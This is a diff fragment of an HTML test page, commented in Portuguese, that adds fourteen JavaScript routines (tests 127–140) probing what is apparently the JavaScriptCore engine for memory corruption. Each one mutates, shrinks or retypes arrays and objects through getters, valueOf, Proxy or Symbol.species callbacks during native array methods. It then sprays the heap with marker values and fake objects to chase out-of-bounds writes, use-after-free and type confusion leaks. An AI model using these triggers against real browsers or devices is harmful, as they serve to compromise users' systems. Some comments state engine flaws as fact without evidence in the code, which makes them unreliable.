+                let arr = [1.1, 2.2, 3.3, 4.4, 5.5];
+                
+                arr.constructor = {
+                    [Symbol.species]: function() {
+                        // O C++ está aguardando o array de destino. Destruímos a origem.
+                        arr.length = 0;
+                        
+                        // Spray rápido
+                        let spray = new Array(1000).fill(0x1337);
+                        return [];
+                    }
+                };
+                
+                // Dispara o slice nativo
+                let result = arr.slice(0, 4);
+            } catch(e) {}
+            logMsg("Fim do Teste 127.");
+        }
+
+        // Teste 128: Splice Expansion Shift OOB
+        // Inserir elementos com splice obriga o C++ a deslocar (shift) os elementos 
+        // existentes para a direita na Borboleta. Interceptar um elemento com getter e 
+        // encolher o array faz o C++ tentar escrever os novos elementos fora dos limites.
+        function test128() {
+            logMsg("Iniciando Teste 128 (Splice Expansion Shift OOB)...");
+            try {
+                let arr = [1.1, 2.2, 3.3];
+                
+                Object.defineProperty(arr, '1', {
+                    get: function() {
+                        // O C++ está lendo para deslocar. Esvaziamos a matriz.
+                        arr.length = 0;
+                        new ArrayBuffer(1024 * 1024); // Pressiona o fastMalloc
+                        return 2.2;
+                    }
+                });
+                
+                // Insere 3 novos elementos a partir do índice 1. 
+                // O motor vai ler o índice 1 (acionando o getter) e se desorientar no memmove.
+                arr.splice(1, 0, 4.4, 5.5, 6.6);
+            } catch(e) {}
+            logMsg("Fim do Teste 128.");
+        }
+
+        // Teste 129: Object.seal Left-Wing Race
+        // Object.seal() muda a StructureID, impedindo que a "Asa Esquerda" (propriedades) cresça.
+        // Interceptar a criação de múltiplas propriedades com Object.assign e disparar um
+        // seal() no meio da cópia quebra o iterador nativo de propriedades.
+        function test129() {
+            logMsg("Iniciando Teste 129 (Object.seal Left-Wing)...");
+            try {
+                let target = {};
+                let source = {};
+                
+                Object.defineProperty(source, 'trigger', {
+                    get: function() {
+                        // O C++ está no meio da cópia para o 'target'. Selamos o alvo.
+                        Object.seal(target);
+                        return "trigger_val";
+                    },
+                    enumerable: true
+                });
+                
+                // Adicionamos dezenas de propriedades depois do trigger
+                for(let i = 0; i < 50; i++) source['prop' + i] = i;
+                
+                // Object.assign tentará escrever na Asa Esquerda selada
+                Object.assign(target, source);
+            } catch(e) {}
+            logMsg("Fim do Teste 129.");
+        }
+
+        // Teste 130: IndexOf Fast-Path Type Confusion
+        // indexOf() em Arrays de Floats (ArrayWithDouble) usa um loop C++ extremamente rápido.
+        // Injetar um objeto (Contiguous) no array através de um getter atrasado força o motor
+        // a ler o objeto como um Float e comparar cegamente, gerando Type Confusion.
+        function test130() {
+            logMsg("Iniciando Teste 130 (IndexOf Type Confusion)...");
+            try {
+                let arr = [1.1, 2.2, 3.3, 4.4];
+                let searchTarget = { fake: 0x41414141 };
+                
+                Object.defineProperty(arr, '2', {
+                    get: function() {
+                        // Mudamos o tipo do índice 3 de Double para Object
+                        arr[3] = searchTarget;
+                        return 3.3;
+                    }
+                });
+                
+                // O loop nativo iniciará otimizado para Floats. 
+                // Ao buscar um objeto em uma matriz que acabou de ser corrompida, ele colapsa.
+                let result = arr.indexOf(searchTarget);
+            } catch(e) {}
+            logMsg("Fim do Teste 130.");
+        }
+// Teste 131: Sort Freeze Butterfly Lock
+        // A função nativa de ordenação (sort) em C++ move dados continuamente na Asa Direita.
+        // Se a função comparadora aplicar Object.freeze(), a StructureID muda e a Borboleta 
+        // é travada (Read-Only). O C++ pode tentar forçar a escrita em memória protegida 
+        // ou desviar o ponteiro ao falhar na validação de estado silenciosamente.
+        function test131() {
+            logMsg("Iniciando Teste 131 (Sort Freeze Lock)...");
+            try {
+                let arr = [5.5, 2.2, 8.8, 1.1];
+                let count = 0;
+                
+                arr.sort(function(a, b) {
+                    count++;
+                    if (count === 2) {
+                        // Congelamos o objeto nativamente. A Borboleta não pode mais ser alterada.
+                        Object.freeze(arr);
+                        
+                        // Tentamos forçar a criação de um novo objeto na memória adjacente
+                        let spray = new Array(500).fill(0x41414141);
+                    }
+                    return a - b;
+                });
+            } catch(e) {}
+            logMsg("Fim do Teste 131.");
+        }
+
+        // Teste 132: Unshift Dictionary Transition Race
+        // Unshift desloca a Asa Direita. Se, durante a avaliação dos argumentos a serem inseridos,
+        // nós adicionarmos dezenas de propriedades, o array transita de uma alocação linear 
+        // para um modo "Dicionário", o que força o C++ a realocar a Borboleta inteira.
+        // O C++ vai continuar o unshift na memória antiga.
+        function test132() {
+            logMsg("Iniciando Teste 132 (Unshift Dictionary Transition)...");
+            try {
+                let arr = [1.1, 2.2, 3.3];
+                
+                let detonator = {
+                    valueOf: function() {
+                        // Injetamos propriedades para expandir massivamente a Asa Esquerda
+                        // forçando a realocação da Borboleta em um novo endereço.
+                        for(let i = 0; i < 200; i++) {
+                            arr['out_of_line_' + i] = i;
+                        }
+                        return 4.4;
+                    }
+                };
+                
+                // O detonator executa antes da inserção.
+                // O memmove subsequente no C++ tentará deslocar o array usando o ponteiro obsoleto.
+                arr.unshift(detonator, 5.5, 6.6);
+            } catch(e) {}
+            logMsg("Fim do Teste 132.");
+        }
+
+        // Teste 133: Splice Expansion OOB (Value Truncation)
+        // Similar ao shift, mas forçando uma expansão massiva da Borboleta em C++
+        // ao mesmo tempo em que a capacidade é truncada no JS.
+        function test133() {
+            logMsg("Iniciando Teste 133 (Splice Expansion OOB)...");
+            try {
+                let arr = [1.1, 2.2];
+                
+                let detonator = {
+                    valueOf: function() {
+                        // Truncamos a matriz para tamanho 0, destruindo a Asa Direita
+                        arr.length = 0;
+                        new ArrayBuffer(1024 * 1024); // Pressiona o alocador
+                        return 3.3;
+                    }
+                };
+                
+                // Inserimos 4 elementos e não deletamos nenhum (0).
+                // O C++ calcula o tamanho final como 6, mas o detonator reduz para 0 no meio da execução.
+                arr.splice(1, 0, detonator, 4.4, 5.5, 6.6);
+            } catch(e) {}
+            logMsg("Fim do Teste 133.");
+        }
+
+        // Teste 134: Concat Spreadable Capacity Overflow
+        // Array.prototype.concat pré-calcula a capacidade necessária somando o 'length' de tudo.
+        // Se mudarmos o Symbol.isConcatSpreadable com um getter *durante* a leitura dos arrays,
+        // o C++ tentará empurrar um array inteiro (como um objeto único) em um espaço 
+        // pré-alocado apenas para seus elementos, causando um Heap Overflow direto na nova Borboleta.
+        function test134() {
+            logMsg("Iniciando Teste 134 (Concat Spreadable Overflow)...");
+            try {
+                let targetArray = [1.1, 2.2];
+                let injectArray = [3.3, 4.4, 5.5];
+                
+                Object.defineProperty(injectArray, Symbol.isConcatSpreadable, {
+                    get: function() {
+                        // O C++ calculou a capacidade. Agora expandimos a matriz a ser concatenada
+                        // para forçar o transbordo no momento da cópia em C++.
+                        injectArray.length = 1000;
+                        injectArray.fill(6.6);
+                        return true;
+                    }
+                });
+                
+                let result = targetArray.concat(injectArray);
+            } catch(e) {}
+            logMsg("Fim do Teste 134.");
+        }
+
+        // Teste 135: Array.fill Prototype Setter Shift
+        // O método fill() é altamente otimizado e corre a Asa Direita velozmente.
+        // Se o array for "Holey" (com buracos) e o protótipo tiver um setter para um dos índices,
+        // o C++ terá que interromper a operação otimizada para chamar o JS, abrindo a janela para corrupção.
+        function test135() {
+            logMsg("Iniciando Teste 135 (Array.fill Setter Shift)...");
+            try {
+                let arr = new Array(10); // Holey array (apenas buracos)
+                
+                Object.defineProperty(Array.prototype, '5', {
+                    set: function(val) {
+                        // Quando o fill() chegar no índice 5, ele cai no protótipo.
+                        // Nesse exato milissegundo, mudamos o tamanho do array original.
+                        arr.length = 1;
+                        
+                        // Realocamos a memória livre
+                        let spray = new Array(500).fill({ fakeObj: 0x13371337 });
+                    },
+                    configurable: true
+                });
+                
+                // O C++ tenta preencher todos os 10 índices. No 5º, o array colapsa, 
+                // mas o loop nativo continua escrevendo 8.8 até o índice 10.
+                arr.fill(8.8);
+                
+                // Limpeza para não quebrar o ambiente JS geral
+                delete Array.prototype['5'];
+            } catch(e) {}
+            logMsg("Fim do Teste 135.");
+        }
+// Teste 136: Array.prototype.pop() Type Confusion Race
+        // O C++ do pop() lê o último índice e depois reduz o tamanho.
+        // Se interceptarmos a leitura do último elemento e mudarmos o formato
+        // de toda a matriz (de Double para Object), o pop() pode falhar em converter
+        // o retorno, devolvendo um ponteiro de memória literal como se fosse um Float.
+        function test136() {
+            logMsg("Iniciando Teste 136 (Array.pop Type Confusion)...");
+            try {
+                let arr = [1.1, 2.2, 3.3];
+                let targetObj = { leak_me: 0x1337 };
+                
+                Object.defineProperty(arr, '2', {
+                    get: function() {
+                        // Mudamos abruptamente a StructureID do array base
+                        arr[0] = targetObj; 
+                        
+                        // Encolhemos a matriz no meio da extração nativa
+                        arr.length = 1;
+                        return 3.3;
+                    },
+                    configurable: true
+                });
+                
+                // O motor tenta extrair o índice 2, dispara o getter, 
+                // corrompe a estrutura, e tenta retornar o valor extraído da memória antiga.
+                let leakedValue = arr.pop();
+            } catch(e) {}
+            logMsg("Fim do Teste 136.");
+        }
+
+        // Teste 137: Object.entries Left-Wing Realignment
+        // Object.entries() varre a "Asa Esquerda" (propriedades dinâmicas) e cria um array 2D.
+        // Se deletarmos e recriarmos propriedades de forma massiva através de um getter no 
+        // meio da varredura, forçamos o C++ a realocar a Borboleta inteira no Heap.
+        // O iterador do entries() continuará lendo o ponteiro fantasma da Asa Esquerda antiga.
+        function test137() {
+            logMsg("Iniciando Teste 137 (Object.entries Left-Wing UAF)...");
+            try {
+                let obj = {};
+                for(let i = 0; i < 50; i++) obj['prop' + i] = i; // Enche a Asa Esquerda
+                
+                Object.defineProperty(obj, 'prop25', {
+                    get: function() {
+                        // O iterador C++ chegou na metade. Apagamos todas as propriedades seguintes.
+                        for(let j = 26; j < 50; j++) delete obj['prop' + j];
+                        
+                        // Forçamos uma nova realocação estrutural massiva (memmove)
+                        for(let j = 100; j < 200; j++) obj['new' + j] = j;
+                        
+                        // Spray rápido na fenda original
+                        let spray = new Array(500).fill(0x41414141);
+                        return "trigger";
+                    },
+                    enumerable: true
+                });
+                
+                // Dispara o iterador C++ sobre as propriedades
+                let entries = Object.entries(obj);
+            } catch(e) {}
+            logMsg("Fim do Teste 137.");
+        }
+
+        // Teste 138: Array.prototype.flatMap() Capacity Expansion OOB
+        // O flatMap mapeia e insere os retornos (arrays) nativamente.
+        // Se retornarmos um array que possui um getter atrelado a um dos seus elementos,
+        // podemos reduzir o array pai original a zero enquanto o C++ ainda tenta 
+        // copiar e espalhar os novos valores nele.
+        function test138() {
+            logMsg("Iniciando Teste 138 (flatMap Expansion OOB)...");
+            try {
+                let parentArr = [1.1, 2.2];
+                
+                let result = parentArr.flatMap(function(val, idx) {
+                    let retArray = [val, val + 1];
+                    
+                    if (idx === 1) {
+                        Object.defineProperty(retArray, '0', {
+                            get: function() {
+                                // O C++ está lendo retArray para fundir no parentArr.
+                                // Destruímos o array raiz (parentArr) durante a cópia.
+                                parentArr.length = 0;
+                                
+                                // Pressão no alocador
+                                new ArrayBuffer(1024 * 1024);
+                                return 4.4;
+                            }
+                        });
+                    }
+                    return retArray;
+                });
+            } catch(e) {}
+            logMsg("Fim do Teste 138.");
+        }
+
+        // Teste 139: Unshift Sparse/Dictionary Desync
+        // Array com buracos (Sparse). O motor converte arrays muito esparsos para Dicionários
+        // (desistindo da alocação contígua na Asa Direita). 
+        // Disparar essa conversão no momento exato em que um unshift tenta deslocar
+        // memória contígua quebra a suposição do LLInt sobre a estrutura da Borboleta.
+        function test139() {
+            logMsg("Iniciando Teste 139 (Unshift Sparse Desync)...");
+            try {
+                let arr = [1.1, 2.2, 3.3];
+                
+                let detonator = {
+                    valueOf: function() {
+                        // Convertemos o array para "Sparse/Dictionary Mode"
+                        // criando um índice astronomicamente alto
+                        arr[1000000] = 9.9;
+                        return 4.4;
+                    }
+                };
+                
+                // O detonator executa antes da inserção.
+                // O JSC tenta continuar a cópia de memória sequencial num array que 
+                // não possui mais a Asa Direita contígua (agora é um Dicionário C++).
+                arr.unshift(detonator, 5.5);
+            } catch(e) {}
+            logMsg("Fim do Teste 139.");
+        }
+
+        // Teste 140: Splice Proxy Shift Memmove OOB
+        // Passamos o array por um Proxy. O método splice calcula nativamente quantos
+        // itens devem ser deletados e inseridos, e faz os shifts (memmove) baseados nisso.
+        // Se o Proxy mentir sobre as propriedades no meio do processo ou apagar dados,
+        // o C++ tentará deslocar ponteiros para muito além da capacidade real da matriz.
+        function test140() {
+            logMsg("Iniciando Teste 140 (Splice Proxy Shift OOB)...");
+            try {
+                let arr = [1.1, 2.2, 3.3, 4.4, 5.5];
+                
+                let proxy = new Proxy(arr, {
+                    get: function(target, prop) {
+                        if (prop === '2') {
+                            // Enquanto o C++ lê para deslocar, nós obliteramos a matriz real
+                            target.length = 0;
+                            
+                            // Re-ocupa a memória liberada
+                            let spray = new Array(200).fill({ fakeObj: 0x13371337 });
+                        }
+                        return target[prop];
+                    }
+                });
+                
+                // Força o splice no Proxy, exigindo shift dos elementos restantes.
+                Array.prototype.splice.call(proxy, 1, 1, 9.9);
+            } catch(e) {}
+            logMsg("Fim do Teste 140.");
+        }
+    </script>
 </body>
 </html>
